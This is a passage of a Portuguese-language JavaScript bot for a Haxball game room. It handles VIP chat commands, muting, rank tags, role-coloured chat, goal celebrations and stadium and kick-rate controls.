                    player.id, errorColor, 'bold', HaxNotification.CHAT)
                return false
            }
        } else {
            room.sendAnnouncement(`Tu só pode usar uniforme vip de 1 a 3!`,
                player.id, errorColor, 'bold', HaxNotification.CHAT)
            return false
        }
    }

    if (capitão == player.id && tipoVip > 1 && msgArray[0].substring(0, 4).toLowerCase() == '!uni') {
        if (vips[authArray[player.id]].unis[msgArray[0].toLowerCase()]) {
            room.setTeamColors(player.team, ...vips[authArray[player.id]].unis[msgArray[0].toLowerCase()])
            room.sendAnnouncement(`O VIP ${player.name} colocou seu uniforme exclusivo!`,
                null, defaultColor, 'bold', HaxNotification.CHAT)
        }
        return false
    }

    if (!player.admin && muteArray.getByAuth(authArray[player.id]) != null) {
        room.sendAnnouncement(
            `Tu está mutado! Aguarde o tempo de mutação.`,
            player.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
        return false;
    }
    if (msgArray[0].toLowerCase() == 't') {
        teamChat(player, message);
        return false;
    }

    if (vipTag != "") {
        switch (msgArray[0].toLowerCase()) {
            case '!p':
                if (player.team != 0) {
                    if (gameState == State.PLAY) {
                        if (!pausarJogoOFF) {
                            vips[authArray[player.id]].pausarJogoOFF = true
                            room.pauseGame(true)
                            setTimeout(() => {
                                room.pauseGame(false);
                            }, 15000);
                            let salvarAuth = authArray[player.id]
                            setTimeout(() => {
                                vips[salvarAuth].pausarJogoOFF = false
                            }, tipoVip == 1 ? 10 * 60 * 1000 : 5 * 60 * 1000)
                            if (tipoVip == 4) {
                                room.sendAnnouncement(
                                    `Jogo pausado 30 segundos pelo VIP: ${player.name}`,
                                    null,
                                    defaultColor,
                                    'bold',
                                    HaxNotification.CHAT);
                                return false
                            }
                            room.sendAnnouncement(
                                `Jogo pausado 15 segundos pelo VIP: ${player.name}`,
                                null,
                                defaultColor,
                                'bold',
                                HaxNotification.CHAT);
                            return false
                        } else {
                            if (tipoVip == 1) {
                                room.sendAnnouncement(
                                    `Tu só pode usar o comando pause a cada 10 minutos. Aguarde...`,
                                    player.id,
                                    errorColor,
                                    'bold',
                                    HaxNotification.CHAT);
                                return false
                            } else {
                                room.sendAnnouncement(
                                    `Tu só pode usar o comando pause a cada 5 minutos. Aguarde...`,
                                    player.id,
                                    errorColor,
                                    'bold',
                                    HaxNotification.CHAT);
                                return false
                            }
                        }
                    } else if (gameState == State.STOP) {
                        room.sendAnnouncement(
                            `Tu só pode pausar enquanto o jogo está em andamento.`,
                            player.id,
                            errorColor,
                            'bold',
                            HaxNotification.CHAT);
                        return false
                    } else {
                        room.sendAnnouncement(
                            `O jogo já está pausado.`,
                            player.id,
                            errorColor,
                            'bold',
                            HaxNotification.CHAT);
                        return false
                    }
                } else {
                    room.sendAnnouncement(
                        `Tu precisa estar jogando para pausar o jogo`,
                        player.id,
                        errorColor,
                        'bold',
                        HaxNotification.CHAT);
                    return false
                }
            case '!pp':
                if (player.team != 0) {
                    if (gameState == State.PAUSE) {
                        if (tipoVip == 1 || tipoVip == 2 || tipoVip == 3 || tipoVip == 4) {
                            if (pausarJogoOFF) {
                                vips[authArray[player.id]].pausarJogoOFF = false
                                room.pauseGame(false);

                                room.sendAnnouncement(`Jogo despausado pelo VIP: ${player.name}`, null, defaultColor, 'bold', 3);

                                return false;
                            }
                        }
                    } else if (gameState == State.STOP) {
                        room.sendAnnouncement(
                            `Você só pode despausar enquanto o jogo está em andamento.`,
                            player.id,
                            errorColor,
                            'bold',
                            HaxNotification.CHAT);
                        return false
                    }
                } else {
                    room.sendAnnouncement(
                        `Você precisa estar jogando para despausar o jogo`,
                        player.id,
                        errorColor,
                        'bold',
                        HaxNotification.CHAT);
                    return false
                }
            case '!corchat':
                let regEx0 = new RegExp(`^[0-9a-fA-F]{6}$`)
                if (regEx0.test(msgArray[1])) {
                    vips[authArray[player.id]].corChat = msgArray[1]
                    room.sendAnnouncement(`A cor do seu chat foi alterada para: ${msgArray[1]}`,
                        player.id, 0xffffff, 'bold', HaxNotification.CHAT);
                } else {
                    room.sendAnnouncement(`Código/Formato de cor inválido! Formato correto: FFFFFF`,
                        player.id, 0xffffff, 'bold', HaxNotification.CHAT);
                }
                return false
            case '!furar':
                if (tipoVip >= 2) {
                    if (player.team == 0) {
                        if (gameState == State.PLAY) {
                            if (furarFila) {
                                vips[authArray[player.id]].furarFila = false

                                room.reorderPlayers([player.id], true);
                                room.sendAnnouncement(`O jogador VIP ${player.name} furou a fila!`, null, cores.laranja, 'bold', HaxNotification.CHAT);

                                let x = tipoVip == 2 ? 40 : tipoVip == 3 ? 30 : 15
                                let salvarAuth = authArray[player.id]
                                setTimeout(() => {
                                    vips[salvarAuth].furarFila = true
                                }, x * 60 * 1000)
                                return false
                            } else {
                                let msgErro = tipoVip == 2 ? '30' : tipoVip == 3 ? '15' : '10'
                                room.sendAnnouncement(`Tu só pode pular a fila a cada ${msgErro} minutos!`,
                                    player.id, errorColor, 'bold', HaxNotification.CHAT);
                                return false
                            }
                        } else {
                            room.sendAnnouncement(`Tu só pode pular a fila com o jogo em andamento!`,
                                player.id, errorColor, 'bold', HaxNotification.CHAT);
                            return false
                        }
                    } else {
                        room.sendAnnouncement(
                            `Tu precisa estar na fila de Spectador para usar este comando!`,
                            player.id, errorColor, 'bold', HaxNotification.CHAT);
                        return false
                    }
                } else {
                    room.sendAnnouncement(
                        `Apenas VIP GOD pode furar a fila!`,
                        player.id, errorColor, 'bold', HaxNotification.CHAT);
                    return false
                }
        }
    }

    if (msgArray[0].substring(0, 9).toLowerCase() == '!entrada' && tipoVip > 1) {
        if (msgArray[1]) {
            vips[authArray[player.id]].msgEntrada = message.substring(9)
            room.sendAnnouncement(`Mensagem de entrada criada/alterada com sucesso!`, player.id, defaultColor, 'bold', HaxNotification.CHAT)
            return false
        } else {
            room.sendAnnouncement('Mensagem vazia! Informe neste formato de exemplo: !entrada texto', player.id, errorColor, 'bold', HaxNotification.CHAT)
            return false
        }
    }

    if (msgArray[0].substring(0, 9).toLowerCase() == '!fonte' && tipoVip >= 1) {
        if (msgArray[1] && msgArray[1] >= 1 && msgArray[1] <= 6) {
            vips[authArray[player.id]].fonte = msgArray[1]
            room.sendAnnouncement(`Fonte alterada com sucesso!`, player.id, defaultColor, 'bold', HaxNotification.CHAT)
            return false
        } else {
            room.sendAnnouncement('Tipo de fonte inválida! Informe neste formato de exemplo: !fonte 2\n !fonte 1 para: normal\n !fonte 2 para: negrito\n !fonte 3 para: itálica\n !fonte 4 para: pequena\n !fonte 5 para: pequena-negrito\n !fonte 6 para: pequena-itálica', player.id, errorColor, 'bold', HaxNotification.CHAT)
            return false
        }
    }

    if (msgArray[0].substring(0, 7).toLowerCase() == '!setpro' && tipoVip > 1) {
        if (tipoVip == 2) {
            if (msgArray[1] != 1) {
                room.sendAnnouncement(`Número da provocação inválido! Tu só pode criar 1 provocação, exemplo: !setpro 1 texto`, player.id, errorColor, 'bold', HaxNotification.CHAT)
                return false
            }
        } else if (tipoVip == 3) {
            if (msgArray[1] < 1 || msgArray[1] > 2) {
                room.sendAnnouncement(`Número da provocação inválido! Tu só pode criar 2 provocações, exemplo: !setpro 2 texto`, player.id, errorColor, 'bold', HaxNotification.CHAT)
                return false
            }
        } else if (tipoVip == 4) {
            if (msgArray[1] < 1 || msgArray[1] > 5) {
                room.sendAnnouncement(`Número da provocação inválido! Tu só pode criar 5 provocações, exemplo: !setpro 5 texto`, player.id, errorColor, 'bold', HaxNotification.CHAT)
                return false
            }
        }
        if (msgArray[2]) {
            vips[authArray[player.id]].provos['!pro' + msgArray[1]] = player.name + ': ' + message.substring(9)
            room.sendAnnouncement(`Provocação ${msgArray[1]} criada com sucesso! Comando para usar: !pro${msgArray[1]}`, player.id, defaultColor, 'bold', HaxNotification.CHAT)
            return false
        } else {
            room.sendAnnouncement('Mensagem vazia!', player.id, errorColor, 'bold', HaxNotification.CHAT)
            return false
        }
        return false
    }

    if (provos[msgArray[0].toLowerCase()]) {
        if (player.team != 0) {
            room.sendAnnouncement(`${player.name}: ` + provos[msgArray[0].toLowerCase()], null, player.team == 1 ? '0xFF8080' : player.team == 2 ? '0x8080FF' : defaultColor, 'bold', HaxNotification.CHAT)
            return false
        } else {
            room.sendAnnouncement(`Tu só pode provocar quando estiver em um time!`,
                player.id, errorColor, 'bold', HaxNotification.CHAT)
            return false;
        }
    }

    if (msgArray[0].substring(0, 4).toLowerCase() == '!pro' && tipoVip > 1) {
        if (player.team != 0) {
            if (vips[authArray[player.id]].provos[msgArray[0].toLowerCase()]) {
                room.sendAnnouncement(vips[authArray[player.id]].provos[msgArray[0].toLowerCase()], null, player.team == 1 ? '0xFF8080' : player.team == 2 ? '0x8080FF' : defaultColor, 'bold', HaxNotification.CHAT)
                return false
            }
        } else {
            room.sendAnnouncement(`Tu só pode provocar quando estiver em um time!`,
                player.id, errorColor, 'bold', HaxNotification.CHAT)
            return false;
        }
    }

    if (msgArray[0][0] == '!') {
        let command = getCommand(msgArray[0].slice(1).toLowerCase());
        if (command != false && commands[command].roles <= getRole(player)) commands[command].function(player, message);
        else
            room.sendAnnouncement(
                `Este comando é inválido! Digite '!ajuda' para obter os comandos disponíveis.`,
                player.id, errorColor, 'bold', HaxNotification.CHAT)
        return false;
    }

    if (localStorage.getItem(authArray[player.id])) {
        var stats = JSON.parse(localStorage.getItem(authArray[player.id]));
        rankTag = stats.pontos >= 45 && stats.pontos < 100 ? "🥉𓊈𝐁𝐫𝐨𝐧𝐳𝐞𓊉" :
            stats.pontos >= 100 && stats.pontos < 200 ? "🥉🥉𓊈𝐁𝐫𝐨𝐧𝐳𝐞𓊉" :
                stats.pontos >= 200 && stats.pontos < 300 ? "🥉🥉🥉𓊈𝗕𝗿𝗼𝗻𝘇𝗲𓊉" :
                    stats.pontos >= 300 && stats.pontos < 400 ? "🥈𓊈𝐏𝐫𝐚𝐭𝐚𓊉" :
                        stats.pontos >= 400 && stats.pontos < 500 ? "🥈🥈𓊈𝐏𝐫𝐚𝐭𝐚𓊉" :
                            stats.pontos >= 500 && stats.pontos < 600 ? "🥈🥈🥈𓊈𝐏𝐫𝐚𝐭𝐚𓊉" :
                                stats.pontos >= 600 && stats.pontos < 700 ? "🥇𓊈𝐎𝐮𝐫𝐨𓊉" :
                                    stats.pontos >= 700 && stats.pontos < 800 ? "🥇🥇𓊈𝐎𝐮𝐫𝐨𓊉" :
                                        stats.pontos >= 800 && stats.pontos < 900 ? "🥇🥇🥇𓊈𝐎𝐮𝐫𝐨𓊉" :
                                            stats.pontos >= 900 && stats.pontos < 1000 ? "💎𓊈𝐃𝐢𝐚𝐦𝐚𝐧𝐭𝐞𓊉" :
                                                stats.pontos >= 1000 && stats.pontos < 1100 ? "💎💎𓊈𝐃𝐢𝐚𝐦𝐚𝐧𝐭𝐞𓊉" :
                                                    stats.pontos >= 1100 && stats.pontos < 1200 ? "💎💎💎𓊈𝐃𝐢𝐚𝐦𝐚𝐧𝐭𝐞𓊉" :
                                                        stats.pontos >= 1200 && stats.pontos < 1300 ? "🛡️𓊈𝐂𝐚𝐦𝐩𝐞𝐚𝐨𓊉" :
                                                            stats.pontos >= 1300 && stats.pontos < 1400 ? "🛡️🛡️𓊈𝐂𝐚𝐦𝐩𝐞𝐚𝐨𓊉" :
                                                                stats.pontos >= 1400 && stats.pontos < 1500 ? "🛡️🛡️🛡️𓊈𝐂𝐚𝐦𝐩𝐞𝐚𝐨𓊉" :
                                                                    stats.pontos >= 1500 && stats.pontos < 1600 ? "🏆𓊈𝐆𝐫𝐚𝐧𝐝𝐞 𝐂𝐚𝐦𝐩𝐞𝐚𝐨𓊉" :
                                                                        stats.pontos >= 1600 && stats.pontos < 1700 ? "🏆🏆𓊈𝐆𝐫𝐚𝐧𝐝𝐞 𝐂𝐚𝐦𝐩𝐞𝐚𝐨𓊉" :
                                                                            stats.pontos >= 1700 && stats.pontos < 1800 ? "🏆🏆🏆𓊈𝐆𝐫𝐚𝐧𝐝𝐞 𝐂𝐚𝐦𝐩𝐞𝐚𝐨𓊉" :
                                                                                stats.pontos >= 1800 && stats.pontos < 1900 ? "🎖️𓊈𝐓𝐡𝐞 𝐁𝐞𝐬𝐭𓊉" :
                                                                                    stats.pontos >= 1900 && stats.pontos < 2000 ? "🎖️🎖️𓊈𝐓𝐡𝐞 𝐁𝐞𝐬𝐭𓊉" :
                                                                                        stats.pontos >= 2000 && stats.pontos < 2100 ? "🎖️🎖️🎖️𓊈𝐓𝐡𝐞 𝐁𝐞𝐬𝐭𝗹𓊉" :
                                                                                            stats.pontos >= 2100 && stats.pontos < 2200 ? "🌀𓊈𝐕𝐨𝐫𝐭𝐞𝐱𓊉" :
                                                                                                stats.pontos >= 2200 && stats.pontos < 2300 ? "🌀🌀𓊈𝐕𝐨𝐫𝐭𝐞𝐱𓊉" :
                                                                                                    stats.pontos >= 2300 && stats.pontos < 2400 ? "🌀🌀🌀𓊈𝐕𝐨𝐫𝐭𝐞𝐱𓊉" :
                                                                                                        stats.pontos >= 2400 && stats.pontos < 2500 ? "🔮𓊈𝐁𝐨𝐥𝐚 𝐝𝐞 𝐎𝐮𝐫𝐨𓊉" :
                                                                                                            stats.pontos >= 1500 && stats.pontos < 1600 ? "🔮🔮𓊈𝐁𝐨𝐥𝐚 𝐝𝐞 𝐎𝐮𝐫𝐨𓊉" :
                                                                                                                stats.pontos >= 2600 && stats.pontos < 2700 ? "🔮🔮🔮𓊈𝐁𝐨𝐥𝐚 𝐝𝐞 𝐎𝐮𝐫𝐨𝗶𓊉" :
                                                                                                                    stats.pontos >= 2700 && stats.pontos < 2800 ? "🤖𓊈𝐑𝐨𝐛𝐨𝐳ã𝐨𓊉" :
                                                                                                                        stats.pontos >= 2800 && stats.pontos < 2900 ? "👦🏿𓊈𝐏𝐞𝐥é𓊉" :
                                                                                                                            stats.pontos >= 2900 && stats.pontos < 3000 ? "👽𓊈𝗘𝘅𝘁𝗿𝗮𝘁𝗲𝗿𝗿𝗲𝘀𝘁𝗿𝗲𓊉" :
                                                                                                                                stats.pontos >= 3000 && stats.pontos < 3100 ? "👑𓊈Rei𓊉" :
                                                                                                                                    stats.pontos >= 3100 && stats.pontos ? "🐐𓊈Goat𓊉" : ""
    }

    if (message.length > 100 && player.admin == false && tipoVip < 3) {
        room.sendAnnouncement(`Você excedeu o limite de 100 caracteres! (Desbloqueie com ${vipNames[3]})`, player.id, errorColor, 'bold', 2);
        return false;
    }

    var userColor;

    if (corChat !== "") {
        userColor = '0x' + corChat;
    } else if (cordochat[player.name] && cordochat[player.name].length > 0) {
        userColor = `0x${cordochat[player.name][0]}`;
    } else {
        userColor = '0xE0E0E0';
    }

    recipients.forEach(p => {
        if (masterList.includes(authArray[player.id])) {
            room.sendAnnouncement(`${confirm.includes(player.id) ? "[✔️]" : "[❌]"}${tags[player.name] ? ` 𓊈${tags[player.name]}𓊉 ` : ""} ${player.admin ? `${config.cargos.fundador}` : ''} ${player.name}: ${message}`, p.id, 0xFFFFF, fonte != "2" ? fonte : bold, 1);
        } else if (donoList.includes(authArray[player.id])) {
            room.sendAnnouncement(`${confirm.includes(player.id) ? "[✔️]" : "[❌]"}${tags[player.name] ? ` 𓊈${tags[player.name]}𓊉 ` : ""} ${player.admin ? `${config.cargos.dono}` : ''} ${player.name}: ${message}`, p.id, 0xFFD700, fonte != "2" ? fonte : bold, 1);
        } else if (gerentes.includes(authArray[player.id])) {
            room.sendAnnouncement(`${confirm.includes(player.id) ? "[✔️]" : "[❌]"}${tags[player.name] ? ` 𓊈${tags[player.name]}𓊉 ` : ""} ${player.admin ? `${config.cargos.gerente}` : ''} ${player.name}: ${message}`, p.id, userColor, fonte != "2" ? fonte : bold, 1);
        } else if (adminList.includes(authArray[player.id])) {
            room.sendAnnouncement(`${confirm.includes(player.id) ? "[✔️]" : "[❌]"}${tags[player.name] ? ` 𓊈${tags[player.name]}𓊉 ` : ""} ${player.admin ? `${config.cargos.administrador}` : ''} ${player.name}: ${message}`, p.id, 0x00FF7F, fonte != "2" ? fonte : bold, 1);
        } else if (mods.includes(authArray[player.id])) {
            room.sendAnnouncement(`${confirm.includes(player.id) ? "[✔️]" : "[❌]"}${tags[player.name] ? ` 𓊈${tags[player.name]}𓊉 ` : ""} ${player.admin ? `${config.cargos.moderador}` : ''} ${player.name}: ${message}`, p.id, 0xFF4500, fonte != "2" ? fonte : bold, 1);
        } else {
            room.sendAnnouncement(`${confirm.includes(player.id) ? "[✔️]" : "[❌]"}${vipTag} ${tags[player.name] ? ` 𓊈${tags[player.name]}𓊉 ` : ""} ${player.admin ? `${config.cargos.Admin}` : ''} ${player.name}: ${message}`, p.id, userColor, fonte != "" ? fonte : null, 1);
        }
    });

    return false;
}

room.onPlayerActivity = function (player) {
    if (gameState !== State.STOP) {
        let pComp = getPlayerComp(player);
        if (pComp != null) pComp.inactivityTicks = 0;
    }
};

room.onPlayerBallKick = function (player) {
    if (playSituation != Situation.GOAL) {
        var ballPosition = room.getBallPosition();
        if (game.touchArray.length == 0 || player.id != game.touchArray[game.touchArray.length - 1].player.id) {
            if (playSituation == Situation.KICKOFF) playSituation = Situation.PLAY;
            lastTeamTouched = player.team;
            game.touchArray.push(
                new BallTouch(
                    player,
                    game.scores.time,
                    getGoalGame(),
                    ballPosition
                )
            );
            lastTouches[0] = checkGoalKickTouch(
                game.touchArray,
                game.touchArray.length - 1,
                getGoalGame()
            );
            lastTouches[1] = checkGoalKickTouch(
                game.touchArray,
                game.touchArray.length - 2,
                getGoalGame()
            );
        }
    }
};

/* GAME MANAGEMENT */
function obterCorAleatoria() {
    const nomesCores = Object.keys(cores);
    const indiceAleatorio = Math.floor(Math.random() * nomesCores.length);
    const corAleatoria = cores[nomesCores[indiceAleatorio]];
    return corAleatoria;
}


room.onGameStart = function (byPlayer) {
    if (teamRed.length >= teamSize || teamBlue.length >= teamSize) {
        room.pauseGame(true);
        room.sendAnnouncement(`Jogo pausado por 5 segundos para as apostas.`, null, cores.ciano, "bold", 2);

        setTimeout(function () {
            room.pauseGame(false);
        }, 5000);
    }

    /* setInterval(function() {
        const corAleatoria = obterCorAleatoria();
        
        room.setDiscProperties(0, { 
            color: corAleatoria.toString(16), 
        });
    
    }, 5000); */

    clearTimeout(startTimeout)
    if (byPlayer != null) clearTimeout(stopTimeout);
    game = new Game();
    possession = [0, 0];
    actionZoneHalf = [0, 0];
    gameState = State.PLAY;
    endGameVariable = false;
    goldenGoal = false;
    playSituation = Situation.KICKOFF;
    lastTouches = Array(2).fill(null);
    lastTeamTouched = Team.SPECTATORS;
    teamRedStats = [];
    teamBlueStats = [];
    if (teamRed.length >= teamSize && teamBlue.length >= teamSize) {
        for (var i = 0; i < teamSize; i++) {
            teamRedStats.push(teamRed[i]);
            teamBlueStats.push(teamBlue[i]);
        }
    }
    calculateStadiumVariables();
};

room.onGameStop = function (byPlayer) {
    if (vipTimeoutIdR || vipTimeoutIdB) {
        stopChangeVip(vipTimeoutIdR, vipTimeoutIdB);
    } 
    currentVipValue = 0;

    clearTimeout(stopTimeout);
    clearTimeout(unpauseTimeout);
    for (let player of teamRed) {
        room.setPlayerAvatar(player.id, null)
    }
    if (byPlayer != null) clearTimeout(startTimeout);
    //game.rec = room.stopRecording();
    if (
        !cancelGameVariable && game.playerComp[0].length + game.playerComp[1].length > 0 &&
        (
            (game.scores.timeLimit != 0 &&
                ((game.scores.time >= 0.5 * game.scores.timeLimit &&
                    game.scores.time < 0.75 * game.scores.timeLimit &&
                    game.scores.red != game.scores.blue) ||
                    game.scores.time >= 0.75 * game.scores.timeLimit)
            ) ||
            endGameVariable
        )
    ) {
        if (fetchRecordingVariable) {
            setTimeout((gameEnd) => { fetchRecording(gameEnd); }, 500, game);
        }
    }
    cancelGameVariable = false;
    gameState = State.STOP;
    playSituation = Situation.STOP;
    updateTeams();
    handlePlayersStop(byPlayer);
    handleActivityStop();
};

room.onGamePause = function (byPlayer) {
    if (mentionPlayersUnpause && gameState == State.PAUSE) {
        if (byPlayer != null) {
            room.sendAnnouncement(
                `Jogo pausado por ${byPlayer.name} !`,
                null,
                defaultColor,
                'bold',
                HaxNotification.NONE
            );
        } else {
            room.sendAnnouncement(
                `Jogo pausado!`,
                null,
                defaultColor,
                'bold',
                HaxNotification.NONE
            );
        }
    }
    clearTimeout(unpauseTimeout);
    gameState = State.PAUSE;
};

room.onGameUnpause = function (byPlayer) {
    unpauseTimeout = setTimeout(() => {
        gameState = State.PLAY;
    }, 2000);
    if (mentionPlayersUnpause) {
        if (byPlayer != null) {
            room.sendAnnouncement(
                `Jogo despausado por ${byPlayer.name} !`,
                null,
                defaultColor,
                'bold',
                HaxNotification.NONE
            );
        } else {
            room.sendAnnouncement(
                `Jogo despausado!`,
                null,
                defaultColor,
                'bold',
                HaxNotification.NONE
            );
        }
    }
    if (
        (teamRed.length == teamSize && teamBlue.length == teamSize && chooseMode) ||
        (teamRed.length == teamBlue.length && teamSpec.length < 2 && chooseMode)
    ) {
        deactivateChooseMode();
    }
};

room.onTeamGoal = function (team) {
    const scores = room.getScores();
    game.scores = scores;
    playSituation = Situation.GOAL;
    ballSpeed = getBallSpeed();
    var goalString = getGoalString(team);
    if (team == 1) {
        for (let player of teamRed) {
            if (vips[authArray[player.id]] && vips[authArray[player.id]].avatarGol[0]) {
                room.setPlayerAvatar(player.id, vips[authArray[player.id]].avatarGol[0])
            } else if (goalAttribution[0].name == player.name) {
                room.setPlayerAvatar(player.id, '⚽')
            } else if (goalAttribution[1]) {
                if (goalAttribution[1].name == player.name) {
                    room.setPlayerAvatar(player.id, '🚩')
                }
            } else {
                room.setPlayerAvatar(player.id, '💪')
            }
            setTimeout(() => {
                room.setPlayerAvatar(player.id, null)
            }, 5000)
        }
        for (let player of teamBlue) {
            if (vips[authArray[player.id]] && vips[authArray[player.id]].avatarGol[1]) {
                room.setPlayerAvatar(player.id, vips[authArray[player.id]].avatarGol[1])
            } else if (goalAttribution[0].name == player.name) {
                room.setPlayerAvatar(player.id, '🤡')
            } else {
                room.setPlayerAvatar(player.id, '😭')
            }
            setTimeout(() => {
                room.setPlayerAvatar(player.id, null)
            }, 5000)
        }
    } else {
        for (let player of teamBlue) {
            if (vips[authArray[player.id]] && vips[authArray[player.id]].avatarGol[0]) {
                room.setPlayerAvatar(player.id, vips[authArray[player.id]].avatarGol[0])
            } else if (goalAttribution[0].name == player.name) {
                room.setPlayerAvatar(player.id, '⚽')
            } else if (goalAttribution[1]) {
                if (goalAttribution[1].name == player.name) {
                    room.setPlayerAvatar(player.id, '🚩')
                }
            } else {
                room.setPlayerAvatar(player.id, '💪')
            }
            setTimeout(() => {
                room.setPlayerAvatar(player.id, null)
            }, 5000)
        }
        for (let player of teamRed) {
            if (vips[authArray[player.id]] && vips[authArray[player.id]].avatarGol[1]) {
                room.setPlayerAvatar(player.id, vips[authArray[player.id]].avatarGol[1])
            } if (goalAttribution[0].name == player.name) {
                room.setPlayerAvatar(player.id, '🤡')
            } else {
                room.setPlayerAvatar(player.id, '😭')
            }
            setTimeout(() => {
                room.setPlayerAvatar(player.id, null)
            }, 5000)
        }
    }
    for (let player of teamRed) {
        var playerComp = getPlayerComp(player);
        team == Team.RED ? playerComp.goalsScoredTeam++ : playerComp.goalsConcededTeam++;
    }
    for (let player of teamBlue) {
        var playerComp = getPlayerComp(player);
        team == Team.BLUE ? playerComp.goalsScoredTeam++ : playerComp.goalsConcededTeam++;
    }
    room.sendAnnouncement(
        goalString,
        null,
        team == Team.RED ? redColor : blueColor,
        'bold',
        HaxNotification.CHAT
    );
    if ((scores.scoreLimit != 0 && (scores.red == scores.scoreLimit || scores.blue == scores.scoreLimit)) || goldenGoal) {
        endGame(team);
        goldenGoal = false;
        stopTimeout = setTimeout(() => {
            room.stopGame();
        }, 1000);
    }
};

room.onPositionsReset = function () {
    lastTouches = Array(2).fill(null);
    lastTeamTouched = Team.SPECTATORS;
    playSituation = Situation.KICKOFF;
};

/* MISCELLANEOUS */

room.onRoomLink = function (url) {
}

room.onPlayerAdminChange = function (changedPlayer, byPlayer) {
    updateTeams();
    if (!changedPlayer.admin && getRole(changedPlayer) >= Role.MASTER) {
        room.setPlayerAdmin(changedPlayer.id, true);
        return;
    }
    updateAdmins(byPlayer != null && !changedPlayer.admin && changedPlayer.id == byPlayer.id ? changedPlayer.id : 0);
};

room.onKickRateLimitSet = function (min, rate, burst, byPlayer) {
    if (byPlayer != null) {
        room.sendAnnouncement(
            `Não é permitido alterar o limite de kickrate. Deve ficar em "6-0-0".`,
            player.id,
            errorColor,
            'bold',
            HaxNotification.CHAT
        );
        room.setKickRateLimit(6, 0, 0);
    }
};

room.onStadiumChange = function (newStadiumName, byPlayer) {
    if (byPlayer !== null) {
        if (getRole(byPlayer) < Role.MASTER && currentStadium != 'other') {
            room.sendAnnouncement(
                `Você não pode mudar de estádio manualmente! Por favor, use os comandos do estádio.`,
                byPlayer.id,
                errorColor,
                'bold',
                HaxNotification.CHAT
            );
            stadiumCommand(emptyPlayer, `!${currentStadium}`);
        } else {
            room.sendAnnouncement(
                `Mapa alterado. Depois de terminar com este mapa, use os comandos do estádio.`,
                byPlayer.id,
                infoColor,
                'bold',
                HaxNotification.CHAT
            );
            currentStadium = 'other';
        }
    }
    checkStadiumVariable = true;
};

document.title = `${roomName}`;

room.onGameTick = function () {
    checkTime();
    getLastTouchOfTheBall();
    getGameStats();
    handleActivity();
    controleAposta();
}

setInterval(() => {
    room.sendAnnouncement(`Faça Parte da Comunidade da haxlendas: ${discord}`,
        null, 0x426AD6, 'bold', HaxNotification.CHAT)
}, 5 * 60 * 1000);

setInterval(() => {
    removeBanimentosExpirados();
}, 30000);

function globalInit() {
    smp();
    sendPasswordStaff(false);
    sendPasswordDono(false);
    sendPasswordFundador(false);
    sendPasswordMod(false);
    sendPasswordVip(false);
}

globalInit();
};